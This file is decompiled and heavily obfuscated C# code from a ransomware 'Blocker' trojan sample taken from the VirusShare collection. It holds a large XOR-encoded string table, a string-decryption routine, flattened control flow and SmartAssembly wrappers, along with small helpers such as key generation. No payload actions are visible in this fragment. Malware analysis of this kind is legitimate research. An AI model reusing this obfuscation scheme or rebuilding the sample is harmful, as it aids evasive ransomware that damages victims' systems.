// Decompiled with JetBrains decompiler
// Type: Ⴈ.Ⴀ
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using SmartAssembly.SmartExceptionsCore;
using System;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace Ⴈ
{
  internal sealed class Ⴀ
  {
    private static readonly char[] Ⴍ;
    private static readonly char[] Ⴃ;
    private static readonly string[] Ⴈ;
    internal static Ⴈ.Ⴀ.Ⴗ Ⴅ;

    [SpecialName]
    public static string \u0001()
    {
      try
      {
        string str;
        try
        {
          str = ႷႭ.ႰႨ(Ⴈ.Ⴀ.Ⴐ(1468303708, 8), Ⴈ.Ⴗ.\u0001(), 223, 237);
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException0(ex);
          throw;
        }
        return str;
      }
      catch (Exception ex)
      {
        string str;
        string o1 = str;
        StackFrameHelper.CreateException1(ex, (object) o1);
        throw;
      }
    }

    [SpecialName]
    public static string \u0002()
    {
      try
      {
        string str;
        try
        {
          str = ႷႭ.ႰႨ(ႷႭ.ႥႳ(1491049055, 0), Ⴈ.Ⴗ.\u0001(), 939, 921);
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException0(ex);
          throw;
        }
        return str;
      }
      catch (Exception ex)
      {
        string str;
        string o1 = str;
        StackFrameHelper.CreateException1(ex, (object) o1);
        throw;
      }
    }

    static Ⴀ()
    {
      int num;
      char[] chArray;
      try
      {
        num = 3;
        while (true)
        {
          switch (num)
          {
            case 0:
              Ⴈ.Ⴀ.Ⴃ = new char[1238]
              {
                char.MinValue,
                '\u0011',
                char.MinValue,
                'ᗔ',
                '㶊',
                'ڥ',
                '∵',
                'ӣ',
                '㒼',
                'ი',
                '⥶',
                'ᖯ',
                '㶼',
                'ڤ',
                '∳',
                'ӽ',
                '㒲',
                'Ⴡ',
                '⥡',
                'ᗒ',
                '\u0001',
                '\u0004',
                char.MinValue,
                '㶊',
                'ڼ',
                '≣',
                'Ұ',
                '\u0002',
                '\t',
                char.MinValue,
                'ۭ',
                '∩',
                'Ҷ',
                '㒄',
                'ႅ',
                '⤩',
                'ᖺ',
                '㶊',
                'چ',
                '\u0003',
                '\b',
                char.MinValue,
                '∄',
                'ӯ',
                '㒄',
                'ვ',
                '⤫',
                'ᖸ',
                '㶎',
                '۶',
                '\u0004',
                '$',
                char.MinValue,
                'Ө',
                '㒜',
                'უ',
                '⥮',
                'ᗨ',
                '㶹',
                '۲',
                '∑',
                'Ӿ',
                '㒲',
                'ი',
                '⥮',
                'ᗋ',
                '㷨',
                '۽',
                '∎',
                'ӊ',
                '㒼',
                'ს',
                '⥰',
                'ᖹ',
                '㶏',
                '۽',
                '∕',
                'һ',
                '㒅',
                'ყ',
                '⥈',
                'ᖤ',
                '㷬',
                'ڬ',
                '∧',
                'Ӽ',
                '㒉',
                '\u10CC',
                '⤥',
                '\u0005',
                '\u0006',
                char.MinValue,
                '㒡',
                'ႝ',
                '⥦',
                'ᖵ',
                '㶲',
                'ۼ',
                '\u0006',
                '$',
                char.MinValue,
                '\u10CA',
                '⥗',
                'ᗃ',
                '㶩',
                'ڬ',
                '∸',
                'Ҵ',
                '㒜',
                'ნ',
                '⥹',
                'ᗸ',
                '㶩',
                'ڏ',
                '∬',
                'һ',
                '㒲',
                'ფ',
                '⥪',
                'ᗻ',
                '㶷',
                'ۿ',
                '∨',
                'Ӵ',
                '㒟',
                'ႝ',
                '⥍',
                'ᖼ',
                '㶬',
                '۽',
                '∰',
                'ӌ',
                '㒿',
                'ო',
                '⥯',
                'ᖲ',
                '㷢',
                '\a',
                '\a',
                char.MinValue,
                '⤰',
                'ᗞ',
                '㶔',
                '۱',
                '∝',
                'ӓ',
                '㒔',
                '\b',
                '\\',
                char.MinValue,
                'ᗛ',
                '㶷',
                'ڢ',
                '∭',
                'ҭ',
                '㒲',
                'ნ',
                '⥫',
                'ᗪ',
                '㶲',
                'ک',
                '∲',
                'Ӵ',
                '㓳',
                'Ⴧ',
                '⥹',
                'ᗼ',
                '㷿',
                'ک',
                '∻',
                'Ө',
                '㒽',
                'ႏ',
                '⥺',
                'ᗺ',
                '㶶',
                'ڧ',
                '∪',
                'ҭ',
                '㒤',
                '\u10C6',
                '⥬',
                'ᗧ',
                '㷿',
                'ڪ',
                '∰',
                'ҭ',
                '㒶',
                'კ',
                '⥹',
                'ᗣ',
                '㶪',
                'ڪ',
                '∪',
                'Ӥ',
                '㒼',
                'Ⴡ',
                '⤸',
                'ᗹ',
                '㶺',
                'ڹ',
                '∭',
                'Ӥ',
                '㒼',
                'Ⴡ',
                '⤸',
                'ᗠ',
                '㶹',
                '۫',
                '∍',
                'Ӡ',
                '㒲',
                'ო',
                '⥬',
                'ᗎ',
                '㶬',
                'ڸ',
                '∻',
                'Ӡ',
                '㒱',
                'Ⴣ',
                '⥡',
                'ᖣ',
                '㷿',
                'ڼ',
                '∶',
                'Ӥ',
                '㒰',
                'Ⴧ',
                '⤸',
                'ᗧ',
                '㶾',
                'ڸ',
                '≾',
                'Ө',
                '㒫',
                'ჟ',
                '⥱',
                'ᗽ',
                '㶺',
                'گ',
                '≰',
                '\t',
                '\u0012',
                char.MinValue,
                '㶌',
                'ڤ',
                '∸',
                'ӹ',
                '㒤',
                '\u10CE',
                '⥪',
                'ᗪ',
                '㶃',
                'ڙ',
                '∻',
                'ө',
                '㓳',
                'შ',
                '⥹',
                'ᗻ',
                '㶺',
                'ڗ',
                '\n',
                '\f',
                char.MinValue,
                'ڦ',
                '∁',
                'Ӂ',
                '㒲',
                'Ⴭ',
                '⥽',
                'ᗣ',
                '㶀',
                'ڏ',
                '∻',
                'Ӿ',
                '㒰',
                '\v',
                '+',
                char.MinValue,
                '√',
                'Ӣ',
                '㓳',
                'Ⴡ',
                '⥷',
                'ᗻ',
                '㷿',
                'ڡ',
                '∱',
                'Ӥ',
                '㒽',
                'ႏ',
                '⥬',
                'ᗧ',
                '㶺',
                '۫',
                '∯',
                'Ӹ',
                '㒲',
                'Ⴣ',
                '⥱',
                'ᗻ',
                '㶦',
                '۫',
                '∷',
                'Ӡ',
                '㒣',
                'ო',
                '⥷',
                'ᗹ',
                '㶺',
                'ڦ',
                '∻',
                'ӣ',
                '㒧',
                'ႏ',
                '⥨',
                'ᗽ',
                '㶰',
                'ڬ',
                '∬',
                'Ӭ',
                '㒾',
                '\f',
                '\u0002',
                char.MinValue,
                'Ӣ',
                '㒸',
                '\r',
                '\b',
                char.MinValue,
                '㒾',
                'ნ',
                '⥻',
                'ᗠ',
                '㶭',
                'ڧ',
                '∷',
                'ӯ',
                '\u000E',
                '\u0097',
                char.MinValue,
                'ც',
                '⥊',
                'ᗝ',
                '㷿',
                '۹',
                '≮',
                'ҽ',
                '㓦',
                '႕',
                '⤸',
                'ᗛ',
                '㶷',
                'ڮ',
                '≾',
                'Ҽ',
                '㓡',
                '႗',
                '⤵',
                'ᗭ',
                '㶶',
                'ڿ',
                '≾',
                'Ө',
                '㒽',
                '\u10CC',
                '⥪',
                'ᗶ',
                '㶯',
                'ڿ',
                '∷',
                'Ӣ',
                '㒽',
                'ႏ',
                '⥱',
                'ᗼ',
                '㷿',
                'ڥ',
                '∱',
                'ӹ',
                '㓳',
                '\u10CE',
                '⥮',
                'ᗮ',
                '㶶',
                'ڧ',
                '∿',
                'ӯ',
                '㒿',
                '\u10CA',
                '⤸',
                'ᗠ',
                '㶱',
                '۫',
                '∪',
                'ӥ',
                '㒺',
                'ნ',
                '⤸',
                'ᗬ',
                '㶰',
                'ڦ',
                '∮',
                'Ӹ',
                '㒧',
                '\u10CA',
                '⥪',
                'ᖡ',
                '㷿',
                'ڒ',
                '∱',
                'Ӹ',
                '㓳',
                'Ⴡ',
                '⥽',
                'ᗪ',
                '㶻',
                '۫',
                '∪',
                'Ӣ',
                '㓳',
                '\u10C6',
                '⥶',
                'ᗼ',
                '㶫',
                'ڪ',
                '∲',
                'ӡ',
                '㓳',
                'მ',
                '⥰',
                'ᗪ',
                '㷿',
                'ڃ',
                '∷',
                'Ӫ',
                '㒻',
                'ႏ',
                '⥝',
                'ᗡ',
                '㶼',
                'ڹ',
                '∧',
                'ӽ',
                '㒧',
                '\u10C6',
                '⥷',
                'ᗡ',
                '㷿',
                'ڛ',
                '∿',
                'Ӯ',
                '㒸',
                'ႏ',
                '⥱',
                'ᗡ',
                '㷿',
                'ڤ',
                '∬',
                'ө',
                '㒶',
                'ო',
                '⤸',
                'ᗻ',
                '㶰',
                '۫',
                '∫',
                'Ӿ',
                '㒶',
                'ႏ',
                '⥬',
                'ᗧ',
                '㶺',
                '۫',
                '∬',
                'Ө',
                '㒣',
                'Ⴠ',
                '⥪',
                'ᗻ',
                '㶶',
                'ڥ',
                '∹',
                'ҭ',
                '㒵',
                '\u10CA',
                '⥹',
                'ᗻ',
                '㶪',
                'ڹ',
                '∻',
                'ң',
                '\u000F',
                '\n',
                char.MinValue,
                '⥝',
                'ᗝ',
                '㶍',
                '۫',
                '≬',
                'ҽ',
                '㓣',
                'ႛ',
                '⤢',
                'ᖯ',
                '\u0010',
                '\u0004',
                char.MinValue,
                'ᖡ',
                '㶶',
                'ڨ',
                '∱',
                '\u0011',
                'N',
                char.MinValue,
                '㶌',
                'ڲ',
                '∭',
                'ӹ',
                '㒶',
                'Ⴢ',
                '⤶',
                'ᗌ',
                '㶰',
                'ڹ',
                '∻',
                'ҡ',
                '㓳',
                'ჹ',
                '⥽',
                'ᗽ',
                '㶬',
                'ڢ',
                '∱',
                'ӣ',
                '㓮',
                'ႝ',
                '⤶',
                'ᖿ',
                '㷱',
                '۾',
                '≰',
                'ҽ',
                '㓿',
                'ႏ',
                '⥛',
                'ᗺ',
                '㶳',
                'ڿ',
                '∫',
                'ӿ',
                '㒶',
                '႒',
                '⥶',
                'ᗪ',
                '㶪',
                'ڿ',
                '∬',
                'Ӭ',
                '㒿',
                'ႃ',
                '⤸',
                'ᗟ',
                '㶪',
                'ک',
                '∲',
                'Ӥ',
                '㒰',
                'ფ',
                '⥽',
                'ᗶ',
                '㶋',
                'ڤ',
                '∵',
                'Ө',
                '㒽',
                '႒',
                '⤯',
                'ᗬ',
                '㶺',
                'ڨ',
                '≦',
                'Ҹ',
                '㒷',
                '႘',
                '⥺',
                'ᗪ',
                '㶾',
                'ۼ',
                '≩',
                'Ҵ',
                '㓫',
                '\u10CA',
                '\u0012',
                '\u0002',
                char.MinValue,
                '۫',
                '≶',
                '\u0013',
                '\a',
                char.MinValue,
                '∋',
                'Ӄ',
                '㒚',
                'წ',
                '⥗',
                'ᗋ',
                '㶚',
                '\u0014',
                '\u0001',
                char.MinValue,
                'Ҽ',
                '\u0015',
                '\u0005',
                char.MinValue,
                '㒑',
                'ზ',
                '⥊',
                'ᗪ',
                '㶹',
                '\u0016',
                '\u0004',
                char.MinValue,
                'ს',
                '⥭',
                'ᗣ',
                '㶳',
                '\u0017',
                '\b',
                char.MinValue,
                '⥙',
                'ᗼ',
                '㶬',
                'ڮ',
                '∳',
                'ӯ',
                '㒿',
                'ზ',
                '\u0018',
                '\b',
                char.MinValue,
                'ᗋ',
                '㶾',
                'ڿ',
                '∻',
                'ә',
                '㒺',
                'Ⴢ',
                '⥽',
                '\u0019',
                '\b',
                char.MinValue,
                '㶜',
                'ڤ',
                '∺',
                'Ө',
                '㒑',
                '\u10CE',
                '⥫',
                'ᗪ',
                '\u001A',
                '\u000E',
                char.MinValue,
                'ڈ',
                '∫',
                'Ӿ',
                '㒧',
                'Ⴠ',
                '⥵',
                'ᗟ',
                '㶭',
                'ڤ',
                '∮',
                'Ө',
                '㒡',
                'მ',
                '⥡',
                '\u001B',
                '\u0005',
                char.MinValue,
                '∛',
                'ӿ',
                '㒡',
                'Ⴠ',
                '⥪',
                '\u001C',
                '\v',
                char.MinValue,
                'Ӛ',
                '㒼',
                'ო',
                '⥳',
                'ᗼ',
                '㶫',
                'ڪ',
                '∪',
                'Ӥ',
                '㒼',
                'Ⴡ',
                '\u001D',
                '\b',
                char.MinValue,
                '㒞',
                '\u10CA',
                '⥬',
                'ᗧ',
                '㶰',
                'گ',
                '∗',
                'Ӊ',
                '\u001E',
                '\a',
                char.MinValue,
                'რ',
                '⥺',
                'ᗥ',
                '㶺',
                'ڨ',
                '∪',
                'Ӿ',
                '\u001F',
                '\v',
                char.MinValue,
                '⥙',
                'ᗼ',
                '㶬',
                'ڮ',
                '∳',
                'ӯ',
                '㒿',
                'ზ',
                '⥑',
                'ᗋ',
                '㶬',
                ' ',
                char.MinValue,
                char.MinValue,
                '!',
                '\u0015',
                char.MinValue,
                '㶛',
                'ڤ',
                '∐',
                'Ӣ',
                '㒧',
                'წ',
                '⥹',
                'ᗿ',
                '㶫',
                'ھ',
                '∬',
                'Ө',
                '㒒',
                'მ',
                '⥬',
                'ᗽ',
                '㶶',
                'ک',
                '∫',
                'ӹ',
                '㒶',
                '"',
                '\u0013',
                char.MinValue,
                'ڎ',
                '∦',
                'Ӯ',
                '㒶',
                'ჟ',
                '⥬',
                'ᗦ',
                '㶰',
                'ڥ',
                '∍',
                'ӹ',
                '㒲',
                '\u10CC',
                '⥳',
                'ᗛ',
                '㶭',
                'ڪ',
                '∽',
                'Ө',
                '#',
                '\u0006',
                char.MinValue,
                '∥',
                'ӡ',
                '㒼',
                '\u10C8',
                '⥷',
                'ᗲ',
                '$',
                '\b',
                char.MinValue,
                'Ӟ',
                '㒻',
                'ლ',
                '⥬',
                'ᗫ',
                '㶰',
                'ڼ',
                '∰',
                '%',
                '\u0016',
                char.MinValue,
                '㒆',
                'ჟ',
                '⥴',
                'ᗠ',
                '㶾',
                'گ',
                '∌',
                'Ө',
                '㒣',
                'Ⴠ',
                '⥪',
                'ᗻ',
                '㶓',
                'ڤ',
                '∹',
                'Ӥ',
                '㒽',
                'ႁ',
                '⥹',
                'ᗼ',
                '㶲',
                'ڳ',
                '&',
                '\u001C',
                char.MinValue,
                'წ',
                '⥹',
                'ᗡ',
                '㶱',
                'ڤ',
                '∪',
                'ҭ',
                '㒰',
                'Ⴠ',
                '⥶',
                'ᗡ',
                '㶺',
                'ڨ',
                '∪',
                'ҭ',
                '㒧',
                'Ⴠ',
                '⤸',
                'ᗸ',
                '㶺',
                'ک',
                '∭',
                'Ө',
                '㒡',
                'კ',
                '⥱',
                'ᗬ',
                '㶺',
                '\'',
                '+',
                char.MinValue,
                '⥑',
                'ᗨ',
                '㶱',
                'ڤ',
                '∬',
                'Ө',
                '㓳',
                'მ',
                '⥰',
                'ᗦ',
                '㶬',
                '۫',
                '∻',
                'ӿ',
                '㒡',
                'Ⴠ',
                '⥪',
                'ᖯ',
                '㶾',
                'ڥ',
                '∺',
                'ҭ',
                '㒲',
                'მ',
                '⥬',
                'ᗪ',
                '㶲',
                'ڻ',
                '∪',
                'ҭ',
                '㒧',
                'Ⴠ',
                '⤸',
                'ᖩ',
                '㶼',
                'ڤ',
                '∰',
                'ӹ',
                '㒺',
                'Ⴡ',
                '⥭',
                'ᗪ',
                '㷱',
                '(',
                '<',
                char.MinValue,
                'ᗜ',
                '㶲',
                'ڪ',
                '∬',
                'ӹ',
                '㒒',
                'ნ',
                '⥫',
                'ᗪ',
                '㶲',
                'ک',
                '∲',
                'Ӵ',
                '㓳',
                'ც',
                '⥶',
                'ᗬ',
                '㶭',
                'ڲ',
                '∮',
                'ӹ',
                '㒶',
                '\u10CB',
                '⤸',
                'ᗊ',
                '㶧',
                'ڨ',
                '∻',
                'ӽ',
                '㒧',
                '\u10C6',
                '⥷',
                'ᗡ',
                '㷿',
                'ڙ',
                '∻',
                'ӽ',
                '㒼',
                'ო',
                '⥬',
                'ᗳ',
                '㷵',
                'ۥ',
                '∭',
                'Ӭ',
                '㒶',
                'Ⴡ',
                '⥻',
                'ᗽ',
                '㶦',
                'ڻ',
                '∪',
                'Ө',
                '㒷',
                'ო',
                '⥽',
                'ᗿ',
                '㶰',
                'ڹ',
                '∪',
                ')',
                '\u0002',
                char.MinValue,
                '㶩',
                'ۿ',
                '*',
                '\u001C',
                char.MinValue,
                'ڛ',
                '∲',
                'Ӭ',
                '㒧',
                '\u10C9',
                '⥷',
                'ᗽ',
                '㶲',
                '۱',
                '≾',
                'ң',
                '㒝',
                'ც',
                '⥌',
                'ᖯ',
                '㷫',
                'ۥ',
                '≮',
                'ҭ',
                '㒺',
                'Ⴡ',
                '⥫',
                'ᗻ',
                '㶾',
                'ڧ',
                '∲',
                'Ө',
                '㒷',
                '+',
                '\u0004',
                char.MinValue,
                '∨',
                'Ҿ',
                '㓽',
                'ႚ',
                ',',
                '\u001C',
                char.MinValue,
                'ӝ',
                '㒿',
                '\u10CE',
                '⥬',
                'ᗩ',
                '㶰',
                'ڹ',
                '∳',
                'ҷ',
                '㓳',
                'ႁ',
                '⥖',
                'ᗊ',
                '㶋',
                '۫',
                '≭',
                'ң',
                '㓦',
                'ႏ',
                '⥱',
                'ᗡ',
                '㶬',
                'ڿ',
                '∿',
                'ӡ',
                '㒿',
                '\u10CA',
                '⥼',
                '-',
                '\u0004',
                char.MinValue,
                '㒥',
                'ႜ',
                '⤶',
                'ᖿ',
                '.',
                '\u001C',
                char.MinValue,
                'ჿ',
                '⥴',
                'ᗮ',
                '㶫',
                'ڭ',
                '∱',
                'ӿ',
                '㒾',
                '႕',
                '⤸',
                'ᖡ',
                '㶑',
                'ڎ',
                '∊',
                'ҭ',
                '㓠',
                'ႁ',
                '⤨',
                'ᖯ',
                '㶶',
                'ڥ',
                '∭',
                'ӹ',
                '㒲',
                'Ⴣ',
                '⥴',
                'ᗪ',
                '㶻',
                '/',
                '\n',
                char.MinValue,
                '⥮',
                'ᖽ',
                '㷱',
                'ۻ',
                '≰',
                'Ҹ',
                '㓣',
                '႘',
                '⤪',
                'ᖸ',
                '0',
                '\u001C',
                char.MinValue,
                'ᗟ',
                '㶳',
                'ڪ',
                '∪',
                'ӫ',
                '㒼',
                'ო',
                '⥵',
                'ᖵ',
                '㷿',
                'ۥ',
                '∐',
                'ӈ',
                '㒇',
                'ႏ',
                '⤪',
                'ᖡ',
                '㷯',
                '۫',
                '∷',
                'ӣ',
                '㒠',
                'მ',
                '⥹',
                'ᗣ',
                '㶳',
                'ڮ',
                '∺',
                '1',
                '\t',
                char.MinValue,
                '㶩',
                'ۺ',
                '≰',
                'Ҽ',
                '㓽',
                'ႛ',
                '⤫',
                'ᖽ',
                '㷭',
                '2',
                '\u001C',
                char.MinValue,
                'ڛ',
                '∲',
                'Ӭ',
                '㒧',
                '\u10C9',
                '⥷',
                'ᗽ',
                '㶲',
                '۱',
                '≾',
                'ң',
                '㒝',
                'ც',
                '⥌',
                'ᖯ',
                '㷮',
                'ۥ',
                '≯',
                'ҭ',
                '㒺',
                'Ⴡ',
                '⥫',
                'ᗻ',
                '㶾',
                'ڧ',
                '∲',
                'Ө',
                '㒷',
                '3',
                '7',
                char.MinValue,
                '∍',
                'ӂ',
                '㒕',
                '჻',
                '⥏',
                'ᗎ',
                '㶍',
                'ڎ',
                '∂',
                'Ӛ',
                '㒼',
                'ი',
                '⤮',
                'ᖻ',
                '㷬',
                '۹',
                '∐',
                'Ӣ',
                '㒷',
                '\u10CA',
                '⥄',
                'ᗂ',
                '㶶',
                'ڨ',
                '∬',
                'Ӣ',
                '㒠',
                'Ⴠ',
                '⥾',
                'ᗻ',
                '㶃',
                'څ',
                '∛',
                'ә',
                '㓳',
                'ჩ',
                '⥪',
                'ᗮ',
                '㶲',
                'ڮ',
                '∩',
                'Ӣ',
                '㒡',
                'Ⴤ',
                '⤸',
                'ᗜ',
                '㶺',
                'ڿ',
                '∫',
                'ӽ',
                '㒏',
                'ს',
                '⥜',
                'ᗟ',
                '㶃',
                '4',
                '\u0001',
                char.MinValue,
                'Ӊ',
                '5',
                '\u0004',
                char.MinValue,
                '㓽',
                'მ',
                '⥠',
                'ᗻ'
              };
              chArray = new char[8];
              num = 5;
              continue;
            case 1:
              num = 2;
              continue;
            case 2:
              chArray[4] = 'ҍ';
              chArray[2] = 'ۋ';
              chArray[6] = 'Ⴏ';
              num = 7;
              continue;
            case 4:
              goto label_9;
            case 5:
              chArray[7] = '⤘';
              chArray[5] = '㓓';
              chArray[3] = '≞';
              goto case 1;
            case 6:
              Ⴈ.Ⴀ.Ⴈ = new string[54];
              num = 4;
              continue;
            case 7:
              chArray[1] = '㷟';
              chArray[0] = 'ᖏ';
              goto case 6;
            default:
              SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
              goto case 0;
          }
        }
label_9:
        Ⴈ.Ⴀ.Ⴍ = chArray;
      }
      catch (Exception ex)
      {
        char[] o1 = chArray;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num;
        StackFrameHelper.CreateException2(ex, (object) o1, (object) o2);
        throw;
      }
    }

    internal static string Ⴐ([In] int obj0, [In] int obj1)
    {
      int num;
      int index1;
      char[] ⴃ;
      int index2;
      string str;
      int length1;
      char[] chArray;
      char[] ⴍ;
      int length2;
      int index3;
      try
      {
label_3:
        index1 = obj0 ^ 1468303782 ^ obj1;
        ⴃ = Ⴈ.Ⴀ.Ⴃ;
        index2 = (int) ⴃ[index1];
        num = 0;
        while (true)
        {
          switch (num)
          {
            case 0:
              num = (str = Ⴈ.Ⴀ.Ⴈ[index2]) == null ? 4 : 13;
              continue;
            case 1:
              index3 = 1 + index3;
              num = 2;
              continue;
            case 2:
              num = index3 < length1 ? 7 : 11;
              continue;
            case 3:
              index3 = 0;
              num = 2;
              continue;
            case 4:
            case 12:
              length1 = (int) ⴃ[index1 + 1];
              length1 = ((int) ⴃ[index1 + 2] << 16) + length1;
              num = 10;
              continue;
            case 6:
            case 11:
              goto label_12;
            case 7:
              chArray[index3] = (char) ((uint) ⴃ[index1 + index3] ^ (uint) ⴍ[(index3 + index2) % length2]);
              num = 1;
              continue;
            case 8:
              goto label_3;
            case 9:
            case 13:
              goto label_5;
            case 10:
              chArray = new char[length1];
              ⴍ = Ⴈ.Ⴀ.Ⴍ;
              length2 = ⴍ.Length;
              index1 += 3;
              num = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴀ.Ⴐ);
              num = 8;
              continue;
          }
        }
label_5:
        return str;
label_12:
        str = new string(chArray);
        Ⴈ.Ⴀ.Ⴈ[index2] = str;
        return str;
      }
      catch (Exception ex)
      {
        object[] objects = new object[12]
        {
          (object) index1,
          (object) index2,
          (object) length1,
          (object) ⴃ,
          (object) str,
          (object) chArray,
          (object) ⴍ,
          (object) length2,
          (object) index3,
          (object) num,
          (object) obj0,
          (object) obj1
        };
        StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    internal static long Ⴄ([In] Stream obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 41:
            num2 = 8;
            break;
          case 42:
            num2 = 6;
            break;
          default:
            num2 = 0;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 3;
              continue;
            case 1:
            case 8:
              goto label_9;
            case 2:
            case 7:
              num1 = 3;
              continue;
            case 3:
              goto label_3;
            case 5:
            case 6:
              goto label_10;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴀ.Ⴄ);
              num1 = 3;
              continue;
          }
        }
label_9:
        return obj0.Length;
label_10:
        return obj0.Position;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        Stream o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static void Ⴀ([In] SymmetricAlgorithm obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
        num1 = 5;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
              num1 = 5;
              continue;
            case 3:
              goto label_7;
            case 4:
              goto label_8;
            default:
              int num2;
              switch (obj2 ^ obj1)
              {
                case 56:
                  num2 = 3;
                  break;
                default:
                  num2 = 2;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.GenerateKey();
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        SymmetricAlgorithm o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static string Ⴜ([In] string obj0, [In] object obj1, [In] object obj2, [In] int obj3, [In] int obj4)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj4 ^ obj3)
        {
          case 75:
            num2 = 5;
            break;
          default:
            num2 = 3;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 7:
              goto label_3;
            case 2:
              num1 = 7;
              continue;
            case 3:
              num1 = 7;
              continue;
            case 5:
            case 6:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴀ.Ⴜ);
              num1 = 7;
              continue;
          }
        }
label_8:
        return string.Format(obj0, obj1, obj2);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        string o2 = obj0;
        object o3 = obj1;
        object o4 = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj4;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, o3, o4, (object) o5, (object) o6);
        throw;
      }
    }

    internal static int ႭႰ([In] int obj0, [In] int obj1)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj1 ^ obj0)
        {
          case 114:
            num2 = 4;
            break;
          default:
            num2 = 5;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 3;
              continue;
            case 1:
            case 4:
            case 7:
              goto label_8;
            case 3:
            case 6:
              goto label_3;
            case 5:
              num1 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴀ.ႭႰ);
              num1 = 3;
              continue;
          }
        }
label_8:
        return Environment.ProcessorCount;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
        throw;
      }
    }

    internal static bool ႭႭ([In] Guid obj0, [In] Guid obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 16:
            num2 = 4;
            break;
          default:
            num2 = 3;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 6:
              num1 = 2;
              continue;
            case 1:
            case 4:
              goto label_8;
            case 2:
              goto label_3;
            case 3:
              num1 = 2;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴀ.ႭႭ);
              num1 = 2;
              continue;
          }
        }
label_8:
        return obj0 != obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<Guid> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<Guid> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    [StructLayout(LayoutKind.Explicit, Size = 2476, Pack = 1)]
    private struct Ⴗ
    {
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct Ⴓ
    {
      internal int Ⴗ;
      internal Bitmap Ⴃ;
      internal Bitmap Ⴀ;
      internal Timer Ⴅ;
      internal float Ⴓ;
      internal float Ⴈ;
    }
  }
}
